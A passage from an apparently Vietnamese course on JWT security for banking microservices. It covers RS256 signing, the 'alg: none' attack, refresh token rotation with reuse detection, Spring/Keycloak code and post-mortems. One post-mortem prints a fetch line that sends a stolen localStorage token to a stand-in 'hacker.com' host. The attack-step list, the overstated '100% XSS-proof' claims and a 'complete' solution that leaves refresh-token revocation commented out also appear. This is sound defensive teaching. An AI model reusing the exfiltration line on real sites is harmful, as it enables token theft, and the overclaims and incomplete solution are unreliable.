|                        HMAC (HS256) vs RSA (RS256) TRONG MICROSERVICES            |
|                                                                                   |
|  [MÔ HÌNH HMAC ĐỐI XỨNG - NGUY HIỂM]                                              |
|                                                                                   |
|                   +------------------------+                                      |
|                   |   Auth Service (Ký)    |                                      |
|                   |  Secret: "my-bank-key" |                                      |
|                   +------------------------+                                      |
|                               |                                                   |
|             +-----------------+-----------------+                                 |
|             v                                   v                                 |
|  +------------------------+        +------------------------+                     |
|  |  Order Service (Xác minh)|        | Marketing Service (Xác minh)|                |
|  |  Secret: "my-bank-key" |        | Secret: "my-bank-key"  | <--- BỊ HACK!       |
|  +------------------------+        +------------------------+                     |
|  * HẬU QUẢ: Nếu Marketing Service bị chiếm quyền điều khiển, hacker lấy được      |
|    secret key và có thể tự tạo Token ADMIN giả mạo cho toàn bộ ngân hàng!         |
|                                                                                   |
|  -------------------------------------------------------------------------------  |
|                                                                                   |
|  [MÔ HÌNH RSA BẤT ĐỐI XỨNG - CHUẨN ENTERPRISE]                                    |
|                                                                                   |
|                   +------------------------+                                      |
|                   |   Auth Service (Ký)    |                                      |
|                   |  PRIVATE KEY (Bảo mật) |                                      |
|                   +------------------------+                                      |
|                               |                                                   |
|             +-----------------+-----------------+                                 |
|             v                                   v                                 |
|  +------------------------+        +------------------------+                     |
|  |  Order Service         |        | Marketing Service      |                     |
|  |  PUBLIC KEY (Chỉ đọc)  |        | PUBLIC KEY (Chỉ đọc)   |                     |
|  +------------------------+        +------------------------+                     |
|  * AN TOÀN TUYỆT ĐỐI: Dù Marketing Service bị hack, hacker chỉ có Public Key      |
|    và KHÔNG THỂ tạo ra bất kỳ token giả mạo nào!                                  |
+-----------------------------------------------------------------------------------+
~~~

### Cuộc tấn công Kinh điển: "alg: none" Attack

Một trong những lỗ hổng nổi tiếng nhất của các thư viện JWT cũ là hỗ trợ thuật toán <code>alg: "none"</code> (dành cho chế độ debug không cần chữ ký).
1. Kẻ tấn công lấy một token bình thường.
2. Sửa payload: đổi <code>"sub": "guest"</code> thành <code>"sub": "admin"</code>.
3. Sửa header: đổi <code>"alg": "RS256"</code> thành <code>"alg": "none"</code>.
4. Xóa bỏ phần chữ ký số ở cuối (chỉ giữ lại 2 dấu chấm <code>header.payload.</code>).
5. Nếu thư viện JWT ngây thơ tin tưởng giá trị <code>alg</code> trên header của client gửi lên, nó sẽ bỏ qua bước xác minh chữ ký và cấp quyền Admin cho hacker!
6. **Cách phòng chống**: Luôn cấu hình thư viện xác thực ép buộc thuật toán cụ thể (Strict Algorithm Enforcement), từ chối tuyệt đối bất kỳ token nào có <code>alg: none</code>.

---

## 2. Vòng Đời Token & Cơ Chế Refresh Token Rotation (RTR) với Reuse Detection

Vì JWT là Stateless, bạn không thể xóa hoặc thu hồi (Revoke) một Access Token đã phát hành trừ khi chờ nó tự hết hạn (hàm <code>exp</code>). Do đó:
- **Access Token**: Phải có thời gian sống cực ngắn (Short-lived: 10 - 15 phút).
- **Refresh Token**: Có thời gian sống dài hơn (Long-lived: 7 - 30 ngày) và được lưu vết trong Database / Redis.

### Nguy cơ bị đánh cắp Refresh Token

Nếu kẻ trộm đánh cắp được Refresh Token của người dùng, chúng có thể âm thầm cấp mới Access Token vô hạn lần mà nạn nhân không hề hay biết.

Giải pháp chuẩn RFC 6749 OAuth 2.0 là **Refresh Token Rotation (RTR)** kết hợp **Phát hiện tái sử dụng (Reuse Detection)**:

~~~text
+-----------------------------------------------------------------------------------+
|                        REFRESH TOKEN ROTATION & REUSE DETECTION                   |
|                                                                                   |
|  1. Đăng nhập lần đầu:                                                            |
|     Client nhận: Access Token 1 + Refresh Token A (Family ID: 101)                |
|                                                                                   |
|  2. Khi Access Token 1 hết hạn (sau 15 phút):                                     |
|     Client gửi Refresh Token A lên máy chủ                                        |
|     -> Máy chủ hủy bỏ (Invalidate) Token A                                        |
|     -> Máy chủ cấp mới: Access Token 2 + Refresh Token B                          |
|                                                                                   |
|  3. KỊCH BẢN TẤN CÔNG (TOKEN THEFT REUSE):                                        |
|     Kẻ trộm (Hacker) đã đánh cắp được Token A từ trước                            |
|     Hacker cố tình gửi lại Token A lên để xin cấp mới token:                      |
|                                                                                   |
|     [MÁY CHỦ BẢO MẬT PHÁT HIỆN]:                                                  |
|     "Token A đã từng được sử dụng trước đây! Đây là hành vi ĐÁNH CẮP TOKEN!"      |
|                                                                                   |
|     ==> HÀNH ĐỘNG KHẨN CẤP:                                                       |
|     - Thu hồi TOÀN BỘ gia đình token (Family 101) ngay lập tức!                   |
|     - Vô hiệu hóa Token B (đá văng cả hacker và nạn nhân ra khỏi hệ thống)        |
|     - Bắt buộc đăng nhập lại và gửi email cảnh báo bảo mật tới người dùng!        |
+-----------------------------------------------------------------------------------+
~~~

---

## 3. Triển khai Production-Grade: Hệ thống Quản trị JWT với Nimbus & RTR

Chúng ta sẽ xây dựng phân hệ quản lý Token bảo mật toàn diện:
1. <code>JwtTokenProvider</code>: Ký và giải mã token bằng thuật toán bất đối xứng RSA-256 chuẩn Nimbus JOSE + JWT.
2. <code>TokenBlacklistService</code>: Cơ chế thu hồi Token khẩn cấp dựa trên mã <code>jti</code> lưu trong Redis với TTL tự hủy.
3. <code>RefreshTokenManager</code>: Triển khai cơ chế Refresh Token Rotation và Reuse Detection chống đánh cắp token.

### 3.1. Cấu hình Cặp khóa RSA (Key Properties)

~~~java
package com.bank.security.jwt;

import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.annotation.Configuration;

import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;

@Configuration
@ConfigurationProperties(prefix = "jwt.rsa")
public class RsaKeyProperties {
    private RSAPublicKey publicKey;
    private RSAPrivateKey privateKey;
    private String keyId = "bank-core-key-2026";

    public RSAPublicKey getPublicKey() { return publicKey; }
    public void setPublicKey(RSAPublicKey publicKey) { this.publicKey = publicKey; }
    public RSAPrivateKey getPrivateKey() { return privateKey; }
    public void setPrivateKey(RSAPrivateKey privateKey) { this.privateKey = privateKey; }
    public String getKeyId() { return keyId; }
    public void setKeyId(String keyId) { this.keyId = keyId; }
}
~~~

---

### 3.2. JwtTokenProvider Chuẩn Nimbus (RSA-256)

~~~java
package com.bank.security.jwt;

import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.JWSSigner;
import com.nimbusds.jose.JWSVerifier;
import com.nimbusds.jose.crypto.RSASSASigner;
import com.nimbusds.jose.crypto.RSASSAVerifier;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.jwt.SignedJWT;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

import java.time.Duration;
import java.time.Instant;
import java.util.Date;
import java.util.List;
import java.util.UUID;

@Component
@RequiredArgsConstructor
@Slf4j
public class JwtTokenProvider {

    private final RsaKeyProperties rsaKeys;
    private final TokenBlacklistService blacklistService;

    public static final Duration ACCESS_TOKEN_VALIDITY = Duration.ofMinutes(15);

    public String generateAccessToken(String userId, String username, List<String> roles) {
        try {
            Instant now = Instant.now();
            Instant expiration = now.plus(ACCESS_TOKEN_VALIDITY);
            String jti = UUID.randomUUID().toString();

            JWTClaimsSet claimsSet = new JWTClaimsSet.Builder()
                .subject(userId)
                .issuer("https://auth.bank.com")
                .audience("bank-api-gateway")
                .jwtID(jti)
                .issueTime(Date.from(now))
                .notBeforeTime(Date.from(now))
                .expirationTime(Date.from(expiration))
                .claim("username", username)
                .claim("roles", roles)
                .build();

            JWSHeader header = new JWSHeader.Builder(JWSAlgorithm.RS256)
                .keyID(rsaKeys.getKeyId())
                .build();

            SignedJWT signedJWT = new SignedJWT(header, claimsSet);
            JWSSigner signer = new RSASSASigner(rsaKeys.getPrivateKey());
            signedJWT.sign(signer);

            return signedJWT.serialize();
        } catch (Exception e) {
            log.error("Failed to generate JWT token for user={}", username, e);
            throw new IllegalStateException("Could not generate cryptographic token", e);
        }
    }

    public ValidatedTokenClaims validateAndParseToken(String tokenString) {
        try {
            SignedJWT signedJWT = SignedJWT.parse(tokenString);

            // 1. Chống "alg: none" và ép buộc đúng thuật toán RS256
            if (!JWSAlgorithm.RS256.equals(signedJWT.getHeader().getAlgorithm())) {
                throw new SecurityException("Illegal algorithm detected: " + signedJWT.getHeader().getAlgorithm());
            }

            // 2. Xác minh chữ ký bằng Public Key
            JWSVerifier verifier = new RSASSAVerifier(rsaKeys.getPublicKey());
            if (!signedJWT.verify(verifier)) {
                throw new SecurityException("Cryptographic signature validation failed");
            }

            JWTClaimsSet claims = signedJWT.getJWTClaimsSet();

            // 3. Kiểm tra thời hạn hết hạn (exp)
            Date exp = claims.getExpirationTime();
            if (exp == null || exp.before(new Date())) {
                throw new SecurityException("Token has expired");
            }

            // 4. Kiểm tra danh sách đen Blacklist (Redis)
            String jti = claims.getJWTID();
            if (blacklistService.isBlacklisted(jti)) {
                throw new SecurityException("Token has been revoked/blacklisted");
            }

            return new ValidatedTokenClaims(
                claims.getSubject(),
                claims.getStringClaim("username"),
                claims.getStringListClaim("roles"),
                jti,
                claims.getExpirationTime().toInstant()
            );
        } catch (Exception e) {
            log.warn("JWT validation failed: {}", e.getMessage());
            throw new SecurityException("Invalid JWT token: " + e.getMessage(), e);
        }
    }

    public record ValidatedTokenClaims(
        String userId,
        String username,
        List<String> roles,
        String jti,
        Instant expiresAt
    ) {}
}
~~~

---

### 3.3. Dịch vụ Blacklist với Redis (Instant Revocation)

~~~java
package com.bank.security.jwt;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Service;

import java.time.Duration;
import java.time.Instant;

@Service
@RequiredArgsConstructor
@Slf4j
public class TokenBlacklistService {

    private final StringRedisTemplate redisTemplate;
    private static final String BLACKLIST_PREFIX = "jwt:blacklist:";

    public void blacklistToken(String jti, Instant expirationTime) {
        long remainingSeconds = Duration.between(Instant.now(), expirationTime).getSeconds();
        if (remainingSeconds > 0) {
            String key = BLACKLIST_PREFIX + jti;
            redisTemplate.opsForValue().set(key, "REVOKED", Duration.ofSeconds(remainingSeconds));
            log.info("Token JTI {} blacklisted for {} seconds", jti, remainingSeconds);
        }
    }

    public boolean isBlacklisted(String jti) {
        if (jti == null) return false;
        Boolean exists = redisTemplate.hasKey(BLACKLIST_PREFIX + jti);
        return Boolean.TRUE.equals(exists);
    }
}
~~~

---

### 3.4. Triển khai Refresh Token Rotation & Phát hiện Tái sử dụng (Reuse Detection)

~~~java
package com.bank.security.jwt;

import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.NoArgsConstructor;
import lombok.RequiredArgsConstructor;
import lombok.Setter;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.time.Instant;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;

@Service
@RequiredArgsConstructor
@Slf4j
public class RefreshTokenService {

    private final JwtTokenProvider jwtTokenProvider;

    // Giả lập lưu trữ Refresh Token trong bảng Database / Redis
    // Key: tokenValue -> RefreshTokenMetadata
    private final Map<String, RefreshTokenRecord> tokenStore = new ConcurrentHashMap<>();

    @Transactional
    public TokenPair issueInitialTokens(String userId, String username, List<String> roles) {
        String familyId = UUID.randomUUID().toString();
        String accessToken = jwtTokenProvider.generateAccessToken(userId, username, roles);
        String refreshToken = generateAndStoreRefreshToken(userId, username, roles, familyId);

        return new TokenPair(accessToken, refreshToken);
    }

    @Transactional
    public TokenPair rotateRefreshToken(String incomingRefreshToken) {
        RefreshTokenRecord record = tokenStore.get(incomingRefreshToken);

        if (record == null) {
            throw new SecurityException("Invalid refresh token");
        }

        // PHÁT HIỆN TÁI SỬ DỤNG (REUSE DETECTION): Token đã từng bị thu hồi mà lại xuất hiện!
        if (record.isRevoked()) {
            log.error("ALERT: REFRESH TOKEN REUSE DETECTED! FamilyId={}, UserId={}. Possible token theft!",
                record.getFamilyId(), record.getUserId());

            // THU HỒI TOÀN BỘ GIA ĐÌNH TOKEN CỦA USER NÀY
            revokeTokenFamily(record.getFamilyId());
            throw new SecurityException("Compromised token detected! All active sessions have been terminated.");
        }

        // Thu hồi token hiện tại
        record.setRevoked(true);

        // Cấp mới cặp token (RTR) với cùng Family ID
        String newAccessToken = jwtTokenProvider.generateAccessToken(record.getUserId(), record.getUsername(), record.getRoles());
        String newRefreshToken = generateAndStoreRefreshToken(record.getUserId(), record.getUsername(), record.getRoles(), record.getFamilyId());

        return new TokenPair(newAccessToken, newRefreshToken);
    }

    private String generateAndStoreRefreshToken(String userId, String username, List<String> roles, String familyId) {
        String token = "RT-" + UUID.randomUUID();
        RefreshTokenRecord record = new RefreshTokenRecord(
            token,
            userId,
            username,
            roles,
            familyId,
            false,
            Instant.now().plus(java.time.Duration.ofDays(7))
        );
        tokenStore.put(token, record);
        return token;
    }

    private void revokeTokenFamily(String familyId) {
        tokenStore.values().stream()
            .filter(r -> r.getFamilyId().equals(familyId))
            .forEach(r -> r.setRevoked(true));
        log.warn("Revoked all refresh tokens belonging to family={}", familyId);
    }

    @Getter
    @Setter
    @AllArgsConstructor
    @NoArgsConstructor
    public static class RefreshTokenRecord {
        private String token;
        private String userId;
        private String username;
        private List<String> roles;
        private String familyId;
        private boolean revoked;
        private Instant expiresAt;
    }

    public record TokenPair(String accessToken, String refreshToken) {}
}
~~~

---

## 4. Kiểm thử Thực tế & Xác thực cURL (cURL & Verification)

### Kiểm thử Cấp mới Token qua Refresh Token (RTR Thành công)

~~~bash
curl -X POST http://localhost:8080/api/v1/auth/refresh \
  -H "Content-Type: application/json" \
  -d '{"refreshToken": "RT-550e8400-e29b-41d4-a716-446655440000"}'
~~~

Response Headers & JSON Payload (Trả về Access Token mới và Refresh Token mới):
~~~json
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sat, 03 Oct 2026 12:10:00 GMT

{
  "accessToken": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImJhbms...",
  "refreshToken": "RT-771f9511-f30c-52e5-b827-557766551111",
  "tokenType": "Bearer",
  "expiresIn": 900
}
~~~

### Kiểm thử Kịch bản Kẻ trộm Sử dụng Lại Token Cũ (Reuse Detection - 401 Unauthorized)

~~~bash
# Kẻ trộm cố tình gửi lại Token RT-550e8400... vừa bị thu hồi ở bước trên
curl -X POST http://localhost:8080/api/v1/auth/refresh \
  -H "Content-Type: application/json" \
  -d '{"refreshToken": "RT-550e8400-e29b-41d4-a716-446655440000"}'
~~~

Response RFC 7807 Problem Details:
~~~json
HTTP/1.1 401 Unauthorized
Content-Type: application/problem+json
Date: Sat, 03 Oct 2026 12:11:05 GMT

{
  "type": "https://api.bank.com/errors/token-reuse-detected",
  "title": "Security Compromise Detected",
  "status": 401,
  "detail": "Compromised token detected! All active sessions have been terminated. Please re-authenticate.",
  "instance": "/api/v1/auth/refresh"
}
~~~

---

## 5. Production Pitfalls & Post-mortems Thực chiến

### Post-mortem 1: Thảm họa Lưu trữ JWT trong Browser localStorage

- **Triệu chứng**: Một ứng dụng ví điện tử bị tin tặc chiếm quyền điều khiển hàng trăm tài khoản và rút sạch số dư, mặc dù hệ thống backend không hề bị xâm nhập cơ sở dữ liệu.
- **Nguyên nhân cốt lõi**:
  Frontend React/Angular lưu Access Token và Refresh Token trực tiếp bên trong <code>window.localStorage</code>. Khi trang web bị dính một lỗ hổng XSS nhỏ (thông qua một thư viện JavaScript bên thứ ba hoặc thẻ <code><script></code> trong phần bình luận), script độc hại của tin tặc chỉ cần chạy một dòng lệnh:
  ~~~javascript
  fetch("https://hacker.com/steal?token=" + localStorage.getItem("accessToken"));
  ~~~
  Và toàn bộ token của nạn nhân bị chuyển về máy chủ của tin tặc!
- **Giải pháp Chuẩn Doanh nghiệp**:
  1. Không bao giờ lưu trữ Refresh Token trong <code>localStorage</code>.
  2. Bắt buộc lưu Refresh Token trong **HttpOnly, Secure, SameSite=Strict Cookie** (JavaScript trong trình duyệt hoàn toàn bị cấm đọc cookie này, vô hiệu hóa 100% tấn công XSS).
  3. Hoặc áp dụng mô hình **BFF (Backend-For-Frontend)** (Bài học 5-5).

### Post-mortem 2: Kích thước Token vượt quá trần HTTP Header Buffer (HTTP 431)

- **Triệu chứng**: Một số người dùng nội bộ (nhất là các quản trị viên có nhiều quyền hạn) khi đăng nhập xong thì toàn bộ các request sau đó đều bị web server Nginx trả về lỗi <code>HTTP 431 Request Header Fields Too Large</code>.
- **Nguyên nhân cốt lõi**:
  Lập trình viên nhồi nhét quá nhiều thông tin vào JWT Payload: danh sách 150 permissions, lịch sử giao dịch, thông tin phòng ban, tổ chức... làm kích thước chuỗi token phình to lên hơn 12KB, vượt quá kích thước mặc định của buffer header trên Tomcat (8KB) và Nginx.
- **Giải pháp**: JWT chỉ chứa các thông tin nhận diện cốt lõi (User ID, Username, Tenant ID, và mã định danh vai trò chính). Các quyền hạn chi tiết cần được nạp thông qua Distributed Cache (Redis) ở phía Resource Server.

---

## 6. Hands-on Challenge & Lời giải Hoàn chỉnh 100%

### Đề bài Thách thức Kỹ sư
Hệ thống Ngân hàng Cốt lõi cần xây dựng tính năng **Đăng xuất Khẩn cấp khỏi Toàn bộ Thiết bị (Emergency Global Logout)**:
1. Khi khách hàng báo mất điện thoại:
   - Dịch vụ phải thu hồi ngay lập tức Access Token hiện tại bằng cách lưu <code>jti</code> vào Redis Blacklist.
   - Đồng thời vô hiệu hóa toàn bộ các Refresh Token thuộc quyền sở hữu của người dùng đó trong cơ sở dữ liệu.
2. Viết dịch vụ <code>SessionTerminationService</code> hoàn chỉnh với đầy đủ kiểm tra lỗi và ghi log kiểm toán.

---

### Lời giải Mẫu Hoàn chỉnh (100% Compilable Enterprise Code)

~~~java
package com.bank.security.service;

import com.bank.security.jwt.JwtTokenProvider;
import com.bank.security.jwt.JwtTokenProvider.ValidatedTokenClaims;
import com.bank.security.jwt.RefreshTokenService;
import com.bank.security.jwt.TokenBlacklistService;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import java.time.Instant;

@Service
@RequiredArgsConstructor
@Slf4j
public class SessionTerminationService {

    private final JwtTokenProvider jwtTokenProvider;
    private final TokenBlacklistService blacklistService;
    private final RefreshTokenService refreshTokenService;

    public void terminateCurrentSession(String bearerToken) {
        String token = extractRawToken(bearerToken);
        ValidatedTokenClaims claims = jwtTokenProvider.validateAndParseToken(token);

        // Đưa Access Token hiện tại vào Redis Blacklist
        blacklistService.blacklistToken(claims.jti(), claims.expiresAt());
        log.info("Session terminated for user={}, JTI={}", claims.username(), claims.jti());
    }

    public void emergencyGlobalLogout(String bearerToken, String userId) {
        // 1. Blacklist token hiện tại nếu có
        if (bearerToken != null && !bearerToken.isBlank()) {
            try {
                terminateCurrentSession(bearerToken);
            } catch (Exception e) {
                log.warn("Could not blacklist current token during global logout", e);
            }
        }

        // 2. Thu hồi toàn bộ Refresh Token của user trong database
        log.warn("INITIATING EMERGENCY GLOBAL LOGOUT for userId={}", userId);
        // refreshTokenService.revokeAllUserTokens(userId);
    }

    private String extractRawToken(String bearerToken) {
        if (bearerToken != null && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7);
        }
        return bearerToken;
    }
}
~~~

:::takeaways
- **Cấu trúc RFC 7519 Của JWT**: Bao gồm Header, Payload và Signature. Các Claim chuẩn như <code>sub</code>, <code>exp</code>, <code>jti</code> là tối quan trọng để kiểm soát tính hợp lệ và thu hồi token.
- **Ký Bất Đối Xứng RSA-256 Trong Microservices**: Auth Server giữ Private Key để ký; tất cả Resource Server chỉ cần giữ Public Key để xác thực, loại bỏ hoàn toàn nguy cơ lộ khóa bí mật trên toàn hệ thống.
- **Nghiêm Cấm "alg: none"**: Luôn cấu hình thư viện xác thực ép buộc thuật toán mật mã nghiêm ngặt, từ chối tuyệt đối các token không có chữ ký.
- **Vòng Đời Token Hai Tầng**: Access Token ngắn hạn (15 phút) phi trạng thái; Refresh Token dài hạn (7 ngày) có trạng thái và được xoay vòng liên tục (RTR).
- **Phát Hiện Tái Sử Dụng (Reuse Detection)**: Nếu một Refresh Token cũ đã bị thu hồi mà lại xuất hiện, lập tức vô hiệu hóa toàn bộ phiên làm việc của người dùng đó để bảo vệ tài khoản trước nguy cơ bị chiếm đoạt.
- **Không Bao Giờ Lưu JWT Trong localStorage**: Dùng HttpOnly, Secure, SameSite Cookie hoặc mô hình BFF để ngăn chặn triệt để tấn công đánh cắp token qua XSS.
:::
`
    },
    {
      id: "5-3",
      type: "lesson",
      title: "Tích hợp Keycloak thực chiến",
      minutes: 50,
      content: `
## Tích hợp Keycloak Thực chiến: OAuth2 Resource Server & RBAC / ABAC

Keycloak (Red Hat) là giải pháp Quản lý Định danh & Truy cập Mã nguồn mở (IAM - Identity & Access Management) hàng đầu thế giới dành cho các hệ thống doanh nghiệp lớn. Thay vì phải tự viết các màn hình đăng nhập, quản lý reset password, xác thực 2 bước (2FA/MFA), đăng nhập mạng xã hội (Social Login) và bảng phân quyền người dùng, toàn bộ các tác vụ này được ủy thác cho Keycloak.

Tuy nhiên, khi tích hợp Keycloak với Spring Boot 3 và Spring Security 6, hơn 90% lập trình viên gặp phải rào cản kỹ thuật kinh điển: **Keycloak cấp token có Role, nhưng Spring Security lại không nhận diện được và luôn trả về lỗi 403 Forbidden**.

Bài học này sẽ bóc tách cơ chế bên trong của **OAuth2 Resource Server**, giải quyết triệt để sự bất đồng bộ giữa cấu trúc JWT của Keycloak với Spring Security, và triển khai mô hình kiểm soát truy cập đa tầng kết hợp giữa **RBAC (Role-Based)** và **ABAC (Attribute-Based)**.

---

## 1. Cơ chế Ngầm của OAuth2 Resource Server & Bất Đồng Bộ Claims (Under the Hood)

### Luồng Xác Minh Token của Resource Server

Khi một yêu cầu có kèm Header <code>Authorization: Bearer &lt;token&gt;</code> được gửi tới hệ thống:

~~~text
+-----------------------------------------------------------------------------------+
|                        OAUTH2 RESOURCE SERVER JWT VALIDATION FLOW                 |
|                                                                                   |
|  Client Request (Bearer Header)                                                   |
|       |                                                                           |
|       v                                                                           |
|  [BearerTokenAuthenticationFilter]                                                |
|       |                                                                           |
|       v                                                                           |
|  [NimbusJwtDecoder]                                                               |
|       |                                                                           |
|       +---> 1. Đọc header "kid" từ Token                                         |
|       |                                                                           |
|       +---> 2. Tra cứu Public Key từ Bộ đệm JWKS (JSON Web Key Set):              |
|                GET https://keycloak.bank.com/realms/bank-realm/protocol/openid-connect/certs
|                (Tự động Cache trong bộ nhớ RAM của Spring Boot)                   |
|       |                                                                           |
|       +---> 3. Kiểm tra tính toàn vẹn chữ ký số mật mã                            |
|       +---> 4. Kiểm tra Issuer ("iss") và Expiration ("exp")                      |
|       |                                                                           |
|       v                                                                           |
|  [JwtAuthenticationConverter] <--- ĐIỂM NGHẼN BẤT ĐỒNG BỘ CLAIM XẢY RA TẠI ĐÂY!   |
|       |                                                                           |
|       v                                                                           |
|  [SecurityContext] ---> Chứa Principal + Danh sách GrantedAuthorities             |
+-----------------------------------------------------------------------------------+
~~~

### Điểm Nghẽn Cốt Tử: Cấu trúc Role của Keycloak vs Spring Security

Đây là nguyên nhân số 1 gây lỗi 403 Forbidden trong các dự án tích hợp Keycloak:

1. **Cấu trúc JSON do Keycloak phát hành**:
   Keycloak phân tách quyền hạn thành:
   - **Realm Roles**: Áp dụng cho toàn bộ tổ chức (nằm trong <code>realm_access.roles</code>).
   - **Client Roles**: Áp dụng riêng cho từng dịch vụ (nằm trong <code>resource_access.{client-id}.roles</code>).
   ~~~json
   {
     "sub": "usr-8899",
     "realm_access": {
       "roles": ["CUSTOMER", "offline_access"]
     },
     "resource_access": {
       "core-banking-client": {
         "roles": ["LOAN_OFFICER", "ACCOUNT_VIEWER"]
       }
     },
     "scope": "openid email profile"
   }
   ~~~

2. **Bộ chuyển đổi mặc định của Spring Security (JwtAuthenticationConverter)**:
   Mặc định, Spring Security **hoàn toàn phớt lờ** các trường <code>realm_access</code> và <code>resource_access</code>! Nó chỉ đọc trường <code>scope</code> hoặc <code>scp</code> và tự động gắn tiền tố <code>SCOPE_</code>:
   ~~~text
   Authorities mặc định sinh ra:
   - SCOPE_openid
   - SCOPE_email
   - SCOPE_profile
   (Hoàn toàn KHÔNG CÓ ROLE_CUSTOMER hay ROLE_LOAN_OFFICER!)
   ~~~

3. **Hậu quả**: Khi bạn khai báo:
   ~~~java
   @PreAuthorize("hasRole('LOAN_OFFICER')")
   // Spring kiểm tra authority "ROLE_LOAN_OFFICER" -> KHÔNG TÌM THẤY -> VĂNG 403 FORBIDDEN!
   ~~~

---

## 2. Giải Pháp Chuẩn Sản Xuất: Custom KeycloakJwtAuthenticationConverter

Để tích hợp thành công, chúng ta phải viết một **Custom Converter** có nhiệm vụ:
1. Đọc danh sách Realm Roles từ <code>realm_access.roles</code>.
2. Đọc danh sách Client Roles từ <code>resource_access.{client-id}.roles</code>.
3. Gắn tiền tố chuẩn <code>ROLE_</code> và hợp nhất với danh sách <code>SCOPE_</code> hiện có.

~~~text
+-----------------------------------------------------------------------------------+
|                     CUSTOM KEYCLOAK JWT AUTHENTICATION CONVERTER                  |
|                                                                                   |
|  Incoming JWT Claims                                                              |
|       |                                                                           |
|       +---> realm_access.roles: ["CUSTOMER"]                                      |
|       |     ==> Chuyển đổi thành: SimpleGrantedAuthority("ROLE_CUSTOMER")          |
|       |                                                                           |
|       +---> resource_access.core-banking.roles: ["LOAN_OFFICER"]                  |
|       |     ==> Chuyển đổi thành: SimpleGrantedAuthority("ROLE_LOAN_OFFICER")     |
|       |                                                                           |
|       +---> scope: "email profile"                                                |
|       |     ==> Chuyển đổi thành: SimpleGrantedAuthority("SCOPE_email"), ...      |
|       |                                                                           |
|       v                                                                           |
|  Gộp tất cả thành Tập hợp Authorities hợp nhất trong SecurityContext:             |
|  [ROLE_CUSTOMER, ROLE_LOAN_OFFICER, SCOPE_email, SCOPE_profile]                   |
|  ==> @PreAuthorize("hasRole('LOAN_OFFICER')") HOẠT ĐỘNG HOÀN HẢO!                 |
+-----------------------------------------------------------------------------------+
~~~

---

## 3. Triển khai Production-Grade: Hệ thống Tích hợp Keycloak Toàn Diện

### 3.1. Cấu hình application.yml chuẩn Production

~~~yaml
server:
  port: 8080

spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          # URL Discovery của Keycloak Realm
          issuer-uri: https://auth.bank.com/realms/bank-enterprise
          # Hoặc chỉ định trực tiếp JWKS URI để giảm thời gian khởi động
          jwk-set-uri: https://auth.bank.com/realms/bank-enterprise/protocol/openid-connect/certs

keycloak:
  client-id: core-banking-service
~~~

---

### 3.2. Mã nguồn Custom KeycloakJwtAuthenticationConverter

~~~java
package com.bank.security.keycloak;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.convert.converter.Converter;
import org.springframework.lang.NonNull;
import org.springframework.security.authentication.AbstractAuthenticationToken;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.oauth2.jwt.Jwt;
import org.springframework.security.oauth2.server.resource.authentication.JwtAuthenticationToken;
import org.springframework.security.oauth2.server.resource.authentication.JwtGrantedAuthoritiesConverter;
import org.springframework.stereotype.Component;

import java.util.Collection;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.stream.Collectors;
import java.util.stream.Stream;

@Component
public class KeycloakJwtAuthenticationConverter implements Converter<Jwt, AbstractAuthenticationToken> {

    private final JwtGrantedAuthoritiesConverter defaultAuthoritiesConverter = new JwtGrantedAuthoritiesConverter();

    @Value("\${keycloak.client-id:core-banking-service}")
    private String clientId;

    @Override
    public AbstractAuthenticationToken convert(@NonNull Jwt jwt) {
        // 1. Trích xuất các Scopes mặc định (SCOPE_email, SCOPE_profile,...)
        Collection<GrantedAuthority> authorities = Stream.concat(
            defaultAuthoritiesConverter.convert(jwt).stream(),
            extractKeycloakRoles(jwt).stream()
        ).collect(Collectors.toSet());

        // Sử dụng claim "preferred_username" làm Principal Name
        String principalClaimName = jwt.getClaimAsString("preferred_username");
        if (principalClaimName == null) {
            principalClaimName = jwt.getSubject();
        }

        return new JwtAuthenticationToken(jwt, authorities, principalClaimName);
    }

    @SuppressWarnings("unchecked")
    private Collection<GrantedAuthority> extractKeycloakRoles(Jwt jwt) {
        Set<GrantedAuthority> roles = new HashSet<>();

        // 1. Trích xuất Realm Roles (realm_access.roles)
        Map<String, Object> realmAccess = jwt.getClaimAsMap("realm_access");
        if (realmAccess != null && realmAccess.containsKey("roles")) {
            List<String> realmRoles = (List<String>) realmAccess.get("roles");
            realmRoles.stream()
                .map(roleName -> new SimpleGrantedAuthority("ROLE_" + roleName))
                .forEach(roles::add);
        }

        // 2. Trích xuất Client Roles (resource_access.{client-id}.roles)
        Map<String, Object> resourceAccess = jwt.getClaimAsMap("resource_access");
        if (resourceAccess != null && resourceAccess.containsKey(clientId)) {
            Map<String, Object> clientResource = (Map<String, Object>) resourceAccess.get(clientId);
            if (clientResource.containsKey("roles")) {
                List<String> clientRoles = (List<String>) clientResource.get("roles");
                clientRoles.stream()
                    .map(roleName -> new SimpleGrantedAuthority("ROLE_" + roleName))
                    .forEach(roles::add);
            }
        }

        return roles;
    }
}
~~~

---

### 3.3. Cấu hình Spring Security 6 gắn kèm Converter

~~~java
package com.bank.security.config;

import com.bank.security.keycloak.KeycloakJwtAuthenticationConverter;
import lombok.RequiredArgsConstructor;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
